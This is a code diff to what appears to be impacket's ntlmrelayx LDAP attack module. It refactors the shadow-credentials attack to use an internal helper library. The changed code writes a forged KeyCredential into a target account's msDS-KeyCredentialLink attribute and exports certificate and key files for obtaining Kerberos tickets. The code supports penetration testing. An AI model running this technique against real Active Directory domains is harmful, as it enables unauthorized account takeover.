@@ -42,11 +42,7 @@ from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.uuid import string_to_bin, bin_to_string
 from impacket.structure import Structure, hexdump
-
-from dsinternals.system.Guid import Guid
-from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
-from dsinternals.system.DateTime import DateTime
-from dsinternals.common.data.hello.KeyCredential import KeyCredential
+from impacket.examples.ntlmrelayx.utils import shadow_credentials
 
 # This is new from ldap3 v2.5
 try:
@@ -286,12 +282,12 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        certificate = X509Certificate2(subject=currentShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        certificate,publicKey,key = shadow_credentials.createX509Certificate(subject=currentShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
-        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
-        LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
-        LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
+        keyCredential = shadow_credentials.CreateKeyCredentialFromX509Certificate(publicKey, deviceId=shadow_credentials.getRandomGUID(), owner=target_dn, currentTime=shadow_credentials.getTimeTicks())
+        #LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+        #LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
         self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
         results = None
         for entry in self.client.response:
@@ -302,7 +298,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('Could not query target user properties')
             return
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential, target_dn )]
             LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
@@ -313,7 +309,7 @@ class LDAPAttack(ProtocolAttack):
                 else:
                     path = self.config.ShadowCredentialsOutfilePath
                 if self.config.ShadowCredentialsExportType == "PEM":
-                    certificate.ExportPEM(path_to_files=path)
+                    shadow_credentials.exportPEM(certificate,key,path_to_files=path)
                     LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
                     LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
@@ -325,7 +321,7 @@ class LDAPAttack(ProtocolAttack):
                         LOG.debug("No pass was provided. The certificate will be store with the password: %s" % password)
                     else:
                         password = self.config.ShadowCredentialsPFXPassword
-                    certificate.ExportPFX(password=password, path_to_file=path)
+                    shadow_credentials.exportPFX(certificate,key,password=password, path_to_file=path)
                     LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                     LOG.info("Must be used with password: %s" % password)
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
